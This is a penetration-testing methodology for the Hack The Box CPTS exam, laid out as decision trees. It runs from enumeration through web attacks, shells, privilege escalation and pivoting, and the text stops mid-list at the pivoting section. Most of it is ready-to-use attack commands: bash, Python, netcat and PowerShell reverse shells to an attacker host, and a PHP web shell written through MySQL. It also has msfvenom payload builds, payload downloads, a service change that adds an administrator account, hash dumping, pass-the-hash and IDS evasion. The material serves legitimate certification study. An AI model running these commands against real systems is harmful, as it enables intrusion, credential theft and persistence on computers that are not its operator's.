# 🎯 CPTS Exam Methodology — Decision Tree

> **Comprehensive, rock-solid methodology for the Hack The Box CPTS exam.**  
> Based on complete analysis of all 27 CPTS Academy modules.

---

## 📋 TABLE OF CONTENTS

1. [Phase 0: Pre-Engagement Setup](#phase-0-pre-engagement-setup)
2. [Phase 1: Information Gathering & Enumeration](#phase-1-information-gathering--enumeration)
3. [Phase 2: Vulnerability Assessment](#phase-2-vulnerability-assessment)
4. [Phase 3: Exploitation](#phase-3-exploitation)
5. [Phase 4: Post-Exploitation & Privilege Escalation](#phase-4-post-exploitation--privilege-escalation)
6. [Phase 5: Lateral Movement & Pivoting](#phase-5-lateral-movement--pivoting)
7. [Phase 6: Documentation & Reporting](#phase-6-documentation--reporting)
8. [Quick Reference: Port-by-Port Decision Tree](#quick-reference-port-by-port-decision-tree)
9. [Quick Reference: Web Attack Decision Tree](#quick-reference-web-attack-decision-tree)
10. [Quick Reference: Privilege Escalation Decision Tree](#quick-reference-privilege-escalation-decision-tree)

---

## Phase 0: Pre-Engagement Setup

### Before You Start the Exam

```
START
  │
  ├─► Set up folder structure:
  │     Project/
  │     ├── scans/
  │     ├── evidence/
  │     │   ├── credentials/
  │     │   └── screenshots/
  │     ├── logs/
  │     ├── tools/
  │     └── notes.md
  │
  ├─► Start tmux session (prefix: Ctrl+B)
  │     ├── Window 0: Main enumeration
  │     ├── Window 1: Exploitation
  │     ├── Window 2: Post-exploitation
  │     └── Window 3: Notes/Documentation
  │
  ├─► Verify VPN connectivity
  │     sudo openvpn user.ovpn
  │     ifconfig tun0
  │
  └─► Prepare cheat sheets & tools
        ├── SecLists wordlists
        ├── Static binaries (socat, nc, chisel)
        └── LinPEAS/WinPEAS
```

---

## Phase 1: Information Gathering & Enumeration

### 1A: Network-Level Enumeration

```
TARGET IP RECEIVED
  │
  ├─► Is this a single host or network range?
  │     │
  │     ├── SINGLE HOST ──► Go to 1B: Host Enumeration
  │     │
  │     └── NETWORK RANGE ──► Host Discovery First
  │           sudo nmap <CIDR> -sn -oA tnet | grep for | cut -d" " -f5
  │           │
  │           └── For each live host ──► Go to 1B
  │
  └─► Do you have credentials already?
        ├── YES ──► Authenticated scanning possible (Nessus/Nmap --script)
        └── NO  ──► Unauthenticated enumeration (default path)
```

### 1B: Host Enumeration — The Core Decision Tree

```
LIVE HOST IDENTIFIED
  │
  ├─► STEP 1: Quick Port Scan (top 1000)
  │     nmap -sC -sV --top-ports=1000 <IP> -oA initial
  │     │
  │     └── While that runs, start ALL-PORT scan in background:
  │           nmap -p- -sV -sC <IP> -oA fullscan &
  │
  ├─► STEP 2: Determine OS from scan results
  │     │
  │     ├── WINDOWS INDICATORS:
  │     │   - Port 3389 (RDP)
  │     │   - Port 5985/5986 (WinRM)
  │     │   - Port 135 (MSRPC)
  │     │   - Port 139+445 (SMB) with Windows details
  │     │   - Port 88 (Kerberos) ──► Active Directory environment!
  │     │   - Port 389/636 (LDAP) ──► Domain Controller!
  │     │   └──► Go to WINDOWS ENUMERATION path
  │     │
  │     └── LINUX INDICATORS:
  │         - Port 22 (SSH) with OpenSSH
  │         - Port 80/443 with Apache/Nginx
  │         - Port 139+445 with Samba
  │         └──► Go to LINUX ENUMERATION path
  │
  └─► STEP 3: UDP Scan (if TCP yields little)
        sudo nmap -sU -top-ports=100 <IP> -oA udp_scan
        (Look for: SNMP 161, DNS 53, TFTP 69, LDAP 389, IPMI 623)

### 1D: Nmap Firewall/IDS Evasion

```
NMAP SCAN BLOCKED OR INCOMPLETE? TRY EVASION:
  ├─► Fragment packets: nmap -f <IP> (8-byte) or nmap -ff <IP> (16-byte)
  ├─► Decoy scan: nmap -D RND:10 <IP>
  ├─► Spoof source port: nmap --source-port 53 <IP> (DNS often allowed)
  ├─► Adjust timing: nmap -T1 <IP> (sneaky) or nmap --scan-delay 1s <IP>
  ├─► Idle/Zombie scan: nmap -sI <zombie_host> <IP>
  ├─► Data length: nmap --data-length 25 <IP>
  └─► Combine: nmap -f -D RND:5 --source-port 53 --data-length 25 -T2 <IP>
```

### 1C: Service-by-Service Enumeration Decision Tree

```
FOR EACH OPEN PORT ──► Follow the appropriate path below:

═══════════════════════════════════════════════════════════════
PORT 21 (FTP)
═══════════════════════════════════════════════════════════════
  │
  ├─► Anonymous login allowed?
  │     ftp <IP> → anonymous:anonymous
  │     │
  │     ├── YES ──► Download ALL files
  │     │     wget -m --no-passive ftp://anonymous:anonymous@<IP>
  │     │     │
  │     │     └── Check for: credentials, configs, notes, SSH keys
  │     │
  │     └── NO ──► Try default credentials, brute force if usernames known
  │
  ├─► Can we UPLOAD files? (writeable directory)
  │     ftp> put test.txt
  │     │
  │     ├── YES + Web server present ──► Upload PHP web shell!
  │     │     └── Access via http://<IP>/upload_dir/shell.php
  │     │
  │     └── NO ──► Continue enumeration
  │
  └─► Version-specific exploits?
        vsftpd 2.3.4 ──► Backdoor (CVE-2011-2523)
        ProFTPD 1.3.5 ─► Backdoor (CVE-2015-3306)

═══════════════════════════════════════════════════════════════
PORT 22 (SSH)
═══════════════════════════════════════════════════════════════
  │
  ├─► Banner grab: nc -nv <IP> 22
  │     └── Note exact version (e.g., OpenSSH 7.6p1 Ubuntu)
  │
  ├─► Have credentials?
  │     ├── YES ──► ssh user@<IP> (preferred over reverse shell!)
  │     │     └── SSH is more stable, supports port forwarding
  │     │
  │     └── NO ──► Check for:
  │           ├── Leaked SSH keys (FTP, SMB shares, GitHub)
  │           ├── Credentials from other services (password reuse)
  │           └── Brute force (if username list available)
  │                 hydra -l user -P wordlist ssh://<IP>
  │
  └─► Key-based auth only?
        └── Find private key on target or in shares

═══════════════════════════════════════════════════════════════
PORT 25/110/143/993/995 (MAIL SERVICES)
═══════════════════════════════════════════════════════════════
  │
  ├─► Enumerate users via SMTP
  │     smtp-user-enum -U wordlist -M VRFY <IP>
  │
  ├─► Check for credentials in other services
  │
  ├─► Open Relay Check
  │     telnet <IP> 25
  │     MAIL FROM: test@test.com → RCPT TO: target@external.com
  │     └── If 250 OK ──► Open relay! Can send phishing emails
  │           swaks --from test@test.com --to target@external.com --server <IP>
  │
  └─► Phishing potential (if in scope)

═══════════════════════════════════════════════════════════════
PORT 53 (DNS)
═══════════════════════════════════════════════════════════════
  │
  ├─► Zone transfer attempt
  │     dig axfr @<IP> <domain>
  │     │
  │     ├── SUCCESS ──► JACKPOT! Full subdomain/IP list
  │     │
  │     └── FAIL ──► Continue with other DNS enum
  │
  ├─► DNS records enumeration
  │     dig any <domain>
  │     dig txt <domain>  (SPF, verification records)
  │     dig mx <domain>
  │
  ├─► Certificate Transparency logs
  │     https://crt.sh/?q=<domain>
  │     └── Find subdomains, internal hostnames, email addresses
  │
  ├─► AD DNS enumeration (if authenticated)
  │     adidnsdump -u <domain>\\user -p <pass> <DC_IP>
  │
  └─► Subdomain brute force
        dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

═══════════════════════════════════════════════════════════════
PORT 623 (IPMI)
═══════════════════════════════════════════════════════════════
  │
  ├─► Version detection: nmap -sU -p 623 --script ipmi-version <IP>
  ├─► Dump hashes (RAKP flaw): msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
  │     └── Crack: hashcat -m 7300 ipmi_hashes.txt rockyou.txt
  └─► Default creds: ADMIN:ADMIN, root:root, admin:admin

═══════════════════════════════════════════════════════════════
PORT 1521 (Oracle TNS)
═══════════════════════════════════════════════════════════════
  │
  ├─► Enumerate SID: ./odat.py sidguesser -s <IP> -p 1521
  ├─► Default creds: scott:tiger, system:oracle
  ├─► With creds ──► ODAT toolkit for file upload/RCE/SMB relay
  └─► git clone https://github.com/quentinhardy/odat.git

═══════════════════════════════════════════════════════════════
PORT 5900 (VNC)
═══════════════════════════════════════════════════════════════
  │
  ├─► Default/weak creds: password:password, password:123456
  ├─► Brute force: hydra -P wordlist vnc://<IP>
  └─► Windows registry: reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password

═══════════════════════════════════════════════════════════════
PORT 80/443/8080/8443 (WEB) ──► See Web Attack Decision Tree below
═══════════════════════════════════════════════════════════════

═══════════════════════════════════════════════════════════════
PORT 139/445 (SMB)
═══════════════════════════════════════════════════════════════
  │
  ├─► Enumerate shares
  │     smbclient -N -L \\\\<IP>\\
  │     crackmapexec smb <IP> --shares
  │     │
  │     ├── NULL session allowed?
  │     │     smbclient -N \\\\<IP>\\<share>
  │     │     │
  │     │     └── Download interesting files (credentials, configs)
  │     │
  │     └── Need credentials?
  │           └── Try from other services / brute force
  │
  ├─► OS & version info
  │     nmap --script smb-os-discovery -p445 <IP>
  │     crackmapexec smb <IP>
  │     │
  │     ├── Windows 7/Server 2008 R2 ──► Check EternalBlue (MS17-010)
  │     │     nmap --script smb-vuln-ms17-010 -p445 <IP>
  │     │
  │     └── Samba ──► Check version for known CVEs
  │
  ├─► Enumerate users (if credentials available)
  │     crackmapexec smb <IP> -u 'user' -p 'pass' --users
  │     rpcclient -U "" <IP> -c "enumdomusers"
  │
  └─► SMB signing disabled?
        └── Potential for NTLM relay attacks

═══════════════════════════════════════════════════════════════
PORT 161 (SNMP)
═══════════════════════════════════════════════════════════════
  │
  ├─► Try default community strings
  │     snmpwalk -v 2c -c public <IP>
  │     onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
  │     │
  │     ├── SUCCESS ──► Enumerate extensively:
  │     │     ├── Process list (may contain credentials!)
  │     │     ├── Installed software
  │     │     ├── Network info
  │     │     └── snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
  │     │           (Windows user enumeration)
  │     │
  │     └── FAIL ──► Try brute forcing community string
  │
  └─► SNMPv3? ──► Try default credentials, brute force with onesixtyone

═══════════════════════════════════════════════════════════════
PORT 389/636/88 (LDAP/KERBERAS) ──► ACTIVE DIRECTORY PATH
═══════════════════════════════════════════════════════════════
  │
  ├─► LDAP enumeration
  │     ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
  │     │
  │     └── Extract: users, groups, policies, domain info
  │
  ├─► Kerberos user enumeration
  │     kerbrute userenum --dc <IP> -d <domain> userlist.txt
  │
  ├─► AS-REP Roasting (users with DONT_REQ_PREAUTH)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │
  └─► Kerberoasting (if we have ANY valid credentials)
        GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request

═══════════════════════════════════════════════════════════════
PORT 1433/3306/5432 (DATABASES)
═══════════════════════════════════════════════════════════════
  │
  ├─► Default credentials?
  │     mssql: sa:sa, sa:blank
  │     mysql: root:blank, root:root
  │
  ├─► Have credentials from other services?
  │     ├── YES ──► Connect and enumerate
  │     │     ├── Read sensitive data
  │     │     ├── Check for xp_cmdshell (MSSQL)
  │     │     └── SELECT INTO OUTFILE (MySQL)
  │     │
  │     └── NO ──► Brute force
  │
  └─► Can we execute commands?
        ├── MSSQL: xp_cmdshell, EXEC master..xp_cmdshell 'whoami'
        └── MySQL: SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'
```

---

## Phase 2: Vulnerability Assessment

```
ENUMERATION COMPLETE (or sufficient data gathered)
  │
  ├─► STEP 1: Organize findings
  │     ├── List all open ports with service versions
  │     ├── List all discovered credentials
  │     ├── List all discovered users
  │     └── List all discovered file paths/shares
  │
  ├─► STEP 2: Search for known vulnerabilities
  │     │
  │     ├── For EACH service version found:
  │     │     searchsploit <service> <version>
  │     │     │
  │     │     ├── Remote code execution? ──► HIGH PRIORITY
  │     │     ├── Authentication bypass? ──► HIGH PRIORITY
  │     │     ├── Privilege escalation? ──► MEDIUM PRIORITY
  │     │     └── Denial of service? ──► LOW PRIORITY (usually skip)
  │     │
  │     └── Check exploit-db.com, rapid7 DB, CVE databases
  │
  ├─► STEP 3: Automated vulnerability scanning (if time permits)
  │     nmap --script vuln -p<ports> <IP>
  │     nikto -h http://<IP>  (for web)
  │
  └─► STEP 4: Prioritize attack vectors
        │
        ├── PRIORITY 1: Remote code execution exploits
        ├── PRIORITY 2: Credential-based access (SSH, SMB, RDP, WinRM)
        ├── PRIORITY 3: Web application vulnerabilities
        ├── PRIORITY 4: Misconfigurations (anonymous FTP, SMB shares)
        └── PRIORITY 5: Brute force (last resort — noisy!)
```

---

## Phase 3: Exploitation

### 3A: Network Service Exploitation Decision Tree

```
VULNERABILITY IDENTIFIED
  │
  ├─► Is there a public exploit available?
  │     │
  │     ├── YES ──► Is it a Metasploit module?
  │     │     │     │
  │     │     │     ├── YES ──► Use Metasploit
  │     │     │     │     msfconsole
  │     │     │     │     search <vulnerability>
  │     │     │     │     use <module>
  │     │     │     │     set RHOSTS <IP>
  │     │     │     │     set LHOST <tun0_IP>
  │     │     │     │     set PAYLOAD <appropriate_payload>
  │     │     │     │     exploit
  │     │     │     │     │
  │     │     │     │     └── Got shell? ──► Go to Phase 4
  │     │     │     │
  │     │     │     └── NO ──► Manual exploitation
  │     │     │           ├── Download PoC from ExploitDB
  │     │     │           ├── Review and understand the code
  │     │     │           ├── Modify for target environment
  │     │     │           └── Execute
  │     │     │
  │     │     └── NO ──► Try manual exploitation techniques
  │     │
  │     └── NO ──► Move to next vulnerability or service
  │
  ├─► Have valid credentials?
  │     │
  │     ├── YES ──► Which service?
  │     │     │
  │     │     ├── SSH ──► ssh user@<IP> (BEST — stable, full TTY)
  │     │     ├── SMB ──► crackmapexec smb/winrm/rdp
  │     │     ├── RDP ──► xfreerdp /v:<IP> /u:user /p:pass
  │     │     ├── WinRM ──► evil-winrm -i <IP> -u user -p pass
  │     │     ├── MSSQL ──► mssqlclient.py user:pass@<IP>
  │     │     └── Web App ──► Login and test for IDOR, upload, etc.
  │     │
  │     └── NO ──► Try password attacks
  │           │
  │           ├── Password spraying (common passwords)
  │           │     crackmapexec smb <IP> -u users.txt -p 'Password1!'
  │           │
  │           ├── Brute force (if username known)
  │           │     hydra -l user -P rockyou.txt <service>://<IP>
  │           │
  │           └── Credential stuffing (from found data)
  │
  └─► Web application exploitation ──► See Web Attack Decision Tree
```

### 3B: Web Attack Decision Tree

```
WEB APPLICATION FOUND (Port 80/443/8080/etc.)
  │
  ├─► STEP 1: Technology Fingerprinting
  │     whatweb http://<IP>
  │     curl -IL http://<IP>
  │     wappalyzer (browser extension)
  │     │
  │     └── Identify: CMS, framework, language, server, OS
  │
  ├─► STEP 2: Directory/File Enumeration
  │     gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
  │     ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  │     │
  │     ├── Found interesting directories? ──► Enumerate deeper
  │     ├── Found login page? ──► Try default creds, brute force
  │     ├── Found upload form? ──► Try file upload attack
  │     ├── Found admin panel? ──► Try default creds, auth bypass
  │     └── Found API endpoint? ──► Test for IDOR, auth issues
  │
  ├─► STEP 3: Subdomain/VHost Enumeration
  │     ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w subdomains.txt -fc 301
  │     gobuster vhost -u http://<IP> -w subdomains.txt --append-domain
  │
  ├─► STEP 4: Check for common web vulnerabilities
  │     │
  │     ├── SOURCE CODE VIEW ──► Check HTML comments, hidden fields, JS files
  │     ├── ROBOTS.TXT ──► Check for hidden paths
  │     ├── CERTIFICATE ──► Check for subdomains, emails
  │     └── ERROR MESSAGES ──► Information disclosure
  │
  └─► STEP 5: Attack specific vulnerability classes
        │
        ├── INPUT FIELDS present?
        │     │
        │     ├── SQL Injection?
        │     │     │   Test: ' OR 1=1-- , " OR 1=1--
        │     │     │   │
        │     │     │   ├── CONFIRMED ──►
        │     │     │   │     ├── Union-based: ' UNION SELECT 1,2,3--
        │     │     │   │     ├── Error-based: Trigger SQL errors
        │     │     │   │     ├── Blind: ' AND SLEEP(5)--
        │     │     │   │     ├── Use sqlmap: sqlmap -u "URL" --forms --batch
        │     │     │   │     └── Read /etc/passwd or web.config
        │     │     │   │           sqlmap -u "URL" --os-shell
        │     │     │   │
        │     │     │   └── NOT CONFIRMED ──► Try other injection types
        │     │     │
        │     ├── Command Injection?
        │     │     │   Test: ; whoami, | id, `id`, $(whoami)
        │     │     │   │
        │     │     │   ├── CONFIRMED ──► Get reverse shell
        │     │     │   │     ; bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
        │     │     │   │
        │     │     │   └── Filtered? ──► Try bypass techniques
        │     │     │         ├── URL encoding: %3B (for ;)
        │     │     │         ├── Double encoding
        │     │     │         ├── Case variation: WhOaMi
        │     │     │         └── Alternative delimiters: %0a (newline)
        │     │     │
        │     ├── XSS (Cross-Site Scripting)?
        │     │     │   Test: <script>alert(1)</script>
        │     │     │   │
        │     │     │   ├── Reflected ──► Cookie stealing, session hijack
        │     │     │   ├── Stored ──► Persistent attack
        │     │     │   └── DOM-based ──► Client-side exploitation
        │     │     │
        │     └── File Inclusion (LFI/RFI)?
        │           │   Test: ?page=../../../etc/passwd
        │           │   │
        │           ├── LFI CONFIRMED ──►
        │           │     ├── Read sensitive files
        │           │     ├── PHP filter wrapper: php://filter/convert.base64-encode/resource=index
        │           │     ├── Log poisoning → RCE
        │           │     └── PHP session poisoning
        │           │
        │           └── RFI CONFIRMED ──►
        │                 ├── Include remote PHP shell
        │                 └── http://<ATTACKER>/shell.php
        │
        ├── FILE UPLOAD present?
        │     │
        │     ├── What extensions are allowed?
        │     │     │   ├── PHP allowed? ──► Upload PHP web shell directly
        │     │     │   ├── Only images? ──► Try:
        │     │     │   │     ├── Double extension: shell.php.jpg
        │     │     │   │     ├── Null byte: shell.php%00.jpg
        │     │     │   │     ├── Content-Type bypass (change MIME type)
        │     │     │   │     ├── Magic bytes: Add GIF89a before PHP code
        │     │     │   │     └── .htaccess upload (if Apache)
        │     │     │   └── Server-side validation only?
        │     │     │         └── Bypass client-side JS checks
        │     │     │
        │     └── Where is the uploaded file?
        │           └── Find upload directory via gobuster/ffuf
        │
        ├── AUTHENTICATION present?
        │     │
        │     ├── Login brute force
        │     │     hydra -l user -P passlist http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
        │     │
        │     ├── Default credentials? ──► Check manufacturer docs
        │     │
        │     └── Auth bypass?
        │           ├── IDOR: Change user ID in URL/cookie
        │           ├── Force browsing: Access /admin directly
        │           └── HTTP Verb Tampering: Try PUT, PATCH instead of POST
        │
        └── SPECIFIC CMS/APP detected?
              │
              ├── WordPress ──►
              │     ├── wpscan --url http://<IP> --enumerate u,p,t
              │     ├── Check wp-content/uploads/ for files
              │     ├── Theme/plugin exploits
              │     └── wp-admin access? ──► Upload plugin with shell
              │
              ├── Drupal ──►
              │     ├── droopescan scan drupal -u http://<IP>
              │     ├── Drupalgeddon2 (CVE-2018-7600)
              │     └── Check /admin access
              │
              ├── Joomla ──►
              │     ├── joomscan -u http://<IP>
              │     └── Check administrator panel
              │
              ├── Tomcat ──►
              │     ├── Default creds: tomcat:tomcat
              │     ├── /manager/html access? ──► Deploy WAR file
              │     └── msfvenom -p java/jsp_shell_reverse_tcp -f war -o shell.war
              │
              ├── ColdFusion ──►
              │     ├── Default creds: admin:admin
              │     ├── Check CFIDE/administrator/index.cfm
              │     ├── Directory Traversal (CVE-2010-2861)
              │     └── RCE via FCKeditor (CVE-2009-2265)
              │
              ├── Splunk ──►
              │     ├── Default creds: admin:changeme
              │     ├── Admin access? ──► Create custom app for RCE!
              │     └── SSRF (CVE-2018-11409)
              │
              ├── osTicket ──►
              │     ├── Default creds: ostadmin:admin
              │     ├── Register with company email → access other services
              │     └── Support tickets may contain sensitive info
              │
              └── Other ──► Searchsploit <app_name> <version>
```

### 3C: Getting a Shell — Decision Tree

```
READY TO GET A SHELL
  │
  ├─► What OS is the target?
  │     │
  │     ├── LINUX ──►
  │     │     │
  │     │     ├── Reverse shell (RECOMMENDED):
  │     │     │     # Start listener first:
  │     │     │     sudo nc -lvnp 443
  │     │     │     │
  │     │     │     # Bash reverse shell:
  │     │     │     bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
  │     │     │     │
  │     │     │     # Python reverse shell:
  │     │     │     python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
  │     │     │     │
  │     │     │     # Netcat reverse shell:
  │     │     │     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER> <PORT> > /tmp/f
  │     │     │     │
  │     │     │     # Use msfvenom for custom payload:
  │     │     │     msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f elf -o shell.elf
  │     │     │
  │     │     └── UPGRADE to full TTY:
  │     │           python3 -c 'import pty;pty.spawn("/bin/bash")'
  │     │           Ctrl+Z
  │     │           stty raw -echo; fg
  │     │           export TERM=xterm
  │     │
  │     └── WINDOWS ──►
  │           │
  │           ├── PowerShell reverse shell:
  │           │   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  │           │
  │           ├── msfvenom payloads:
  │           │   # Reverse TCP shell:
  │           │   msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
  │           │   # Meterpreter:
  │           │   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
  │           │
  │           └── File transfer methods:
  │                 ├── PowerShell: IEX/New-Object Net.WebClient
  │                 ├── Certutil: certutil -urlcache -split -f http://<ATTACKER>/shell.exe
  │                 ├── SMB: impacket-smbserver share /tmp/smbshare -smb2support
  │                 ├── FTP: python3 -m pyftpdlib --port 21
  │                 └── HTTP: python3 -m http.server 80
  │
  └─► Shell obtained? ──► IMMEDIATELY:
        ├── whoami / id
        ├── hostname
        ├── ifconfig / ipconfig
        ├── Check OS version
        └── Go to Phase 4: Post-Exploitation
```

---

## Phase 4: Post-Exploitation & Privilege Escalation

### 4A: Linux Privilege Escalation Decision Tree

```
LINUX SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Stabilize shell (if not already)
  │     python3 -c 'import pty;pty.spawn("/bin/bash")'
  │     Ctrl+Z → stty raw -echo; fg → export TERM=xterm
  │
  ├─► STEP 2: Automated enumeration (transfer & run)
  │     # From attack machine:
  │     python3 -m http.server 80
  │     # On target:
  │     wget http://<ATTACKER>/linpeas.sh
  │     chmod +x linpeas.sh && ./linpeas.sh
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── WHO AM I?
  │     │     id, whoami, groups
  │     │
  │     ├── WHAT CAN I RUN AS ROOT?
  │     │     sudo -l  ← CRITICAL CHECK
  │     │     │
  │     │     ├── (ALL : ALL) ALL ──► sudo su / sudo bash
  │     │     ├── (root) NOPASSWD: <cmd> ──► GTFOBins lookup
  │     │     │     └── https://gtfobins.github.io/
  │     │     └── (root) <specific_binary> ──► Check GTFOBins for escape
  │     │
  │     ├── SUID/GTFOBins:
  │     │     find / -perm -4000 2>/dev/null
  │     │     │
  │     │     └── Unusual SUID binaries? ──► GTFOBins
  │     │
  │     ├── CAPABILITIES:
  │     │     getcap -r / 2>/dev/null
  │     │     │
  │     │     └── cap_setuid+ep ──► Privilege escalation
  │     │
  │     ├── CRON JOBS:
  │     │     cat /etc/crontab
  │     │     ls -la /etc/cron.d/
  │     │     │
  │     │     └── Writable cron script? ──► Add reverse shell
  │     │
  │     ├── SENSITIVE FILES:
  │     │     cat /etc/shadow (readable?)
  │     │     cat /etc/passwd (for user list)
  │     │     find / -name "*.conf" 2>/dev/null | xargs grep -i password
  │     │     find / -name id_rsa 2>/dev/null
  │     │
  │     ├── KERNEL EXPLOITS:
  │     │     uname -a
  │     │     searchsploit linux kernel <version> privilege escalation
  │     │
  │     ├── RUNNING SERVICES:
  │     │     ss -tlnp  (internal services?)
  │     │     │
  │     │     └── Local service on port X? ──► May be vulnerable
  │     │
  │     ├── CREDENTIALS IN FILES:
  │     │     grep -ri password /home/ 2>/dev/null
  │     │     grep -ri password /var/log/ 2>/dev/null
  │     │     cat .bash_history
  │     │
  │     └── NFS SHARES:
  │           cat /etc/exports
  │           │
  │           └── no_root_squash? ──► Mount and write SUID binary
  │
  └─► STEP 4: Escalate!
        │
        ├── sudo misconfiguration? ──► GTFOBins
        ├── SUID binary? ──► GTFOBins
        ├── Writable cron job? ──► Add payload
        ├── Kernel exploit? ──► Use with caution (may crash!)
        ├── Credentials found? ──► su - or ssh as other user
        ├── Capabilities? ──► Exploit cap_setuid
        ├── NFS no_root_squash? ──► Mount + SUID
        └── Docker group? ──► docker run -v /:/mnt --rm -it ubuntu bash
```

### 4B: Windows Privilege Escalation Decision Tree

```
WINDOWS SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Situational Awareness
  │     whoami /all
  │     systeminfo
  │     hostname
  │     net user
  │     net localgroup administrators
  │
  ├─► STEP 2: Automated enumeration
  │     # Transfer and run winPEAS:
  │     certutil -urlcache -split -f http://<ATTACKER>/winPEAS.exe winPEAS.exe
  │     .\winPEAS.exe
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── PRIVILEGES:
  │     │     whoami /priv
  │     │     │
  │     │     ├── SeImpersonatePrivilege ──► PrintSpoofer / GodPotato
  │     │     │     PrintSpoofer.exe -i -c "cmd /c cmd"
  │     │     │
  │     │     ├── SeBackupPrivilege ──► Read any file (SAM, SYSTEM)
  │     │     │     reg save hklm\sam sam
  │     │     │     reg save hklm\system system
  │     │     │
  │     │     ├── SeDebugPrivilege ──► Inject into SYSTEM process
  │     │     │
  │     │     └── SeLoadDriverPrivilege ──► Load malicious driver
  │     │
  │     ├── UNQUOTED SERVICE PATHS:
  │     │     wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
  │     │     │
  │     │     └── Writable path? ──► Place malicious binary
  │     │
  │     ├── SERVICE PERMISSIONS:
  │     │     accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  │     │     │
  │     │     └── Can modify service? ──► Change binPath
  │     │           sc config <service> binPath= "cmd /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"
  │     │
  │     ├── STORED CREDENTIALS:
  │     │     cmdkey /list
  │     │     │
  │     │     └── Saved credentials? ──► runas /savecred
  │     │
  │     ├── AUTologON CREDENTIALS:
  │     │     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  │     │
  │     ├── ALWAYS INSTALLED ELEVATED:
  │     │     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  │     │     │
  │     │     └── Set to 1? ──► Install malicious MSI as SYSTEM
  │     │
  │     ├── SAVED WIFI PASSWORDS:
  │     │     netsh wlan show profiles
  │     │     netsh wlan show profile name="<SSID>" key=clear
  │     │
  │     └── SEARCH FOR PASSWORDS:
  │           findstr /si "password" *.txt *.ini *.xml *.config 2>nul
  │
  └─► STEP 4: Escalate!
        │
        ├── SeImpersonatePrivilege? ──► PrintSpoofer/GodPotato
        ├── SeBackupPrivilege? ──► Dump SAM/SYSTEM
        ├── Service misconfiguration? ──► Modify service binary
        ├── Unquoted service path? ──► Plant binary in path
        ├── AlwaysInstallElevated? ──► Malicious MSI
        ├── Stored credentials? ──► runas /savecred
        ├── Kernel exploit? ──► Use with caution!
        └── Pass-the-Hash? ──► If NTLM hash obtained
              crackmapexec smb <IP> -u user -H <NTLM_HASH>
              psexec.py <domain>/user@<IP> -hashes <LM>:<NTLM>
```

---

## Phase 5: Lateral Movement & Pivoting

```
ROOT/SYSTEM ACCESS OBTAINED ON ONE HOST
  │
  ├─► STEP 1: Pillaging (gather everything!)
  │     │
  │     ├── LINUX:
  │     │     ├── cat /etc/shadow (hashes for cracking)
  │     │     ├── find / -name id_rsa 2>/dev/null (SSH keys)
  │     │     ├── cat .bash_history
  │     │     ├── grep -ri password /home/ /opt/ /var/ 2>/dev/null
  │     │     ├── cat /etc/hosts (other hosts?)
  │     │     ├── arp -a / ss -tlnp (internal services)
  │     │     └── Database credentials in config files
  │     │
  │     └── WINDOWS:
  │           ├── Saved credentials: cmdkey /list
  │           ├── SAM/SYSTEM hives (password hashes)
  │           ├── NTDS.dit (domain hashes from DC)
  │           ├── Browser saved passwords
  │           ├── RDP saved connections
  │           ├── SSH keys in C:\Users\*\.ssh\
  │           └── Search for passwords in files
  │
  ├─► STEP 2: Network discovery from compromised host
  │     │
  │     ├── LINUX:
  │     │     ip route / ifconfig
  │     │     cat /etc/hosts
  │     │     arp -a
  │     │     for i in $(seq 1 254); do ping -c 1 10.10.10.$i & done
  │     │
  │     └── WINDOWS:
  │           ipconfig /all
  │           route print
  │           arp -a
  │           net view /domain
  │
  ├─► STEP 3: Pivoting (if internal networks discovered)
  │     │
  │     ├── SSH tunneling:
  │     │     ssh -L <local_port>:<internal_host>:<internal_port> user@<pivot_host>
  │     │     ssh -D 9050 user@<pivot_host> (SOCKS proxy)
  │     │
  │     ├── Chisel (for when SSH not available):
  │     │     # Attack machine:
  │     │     chisel server --reverse -p 8080
  │     │     # Target machine:
  │     │     chisel client <ATTACKER>:8080 R:socks
  │     │
  │     └── Proxychains:
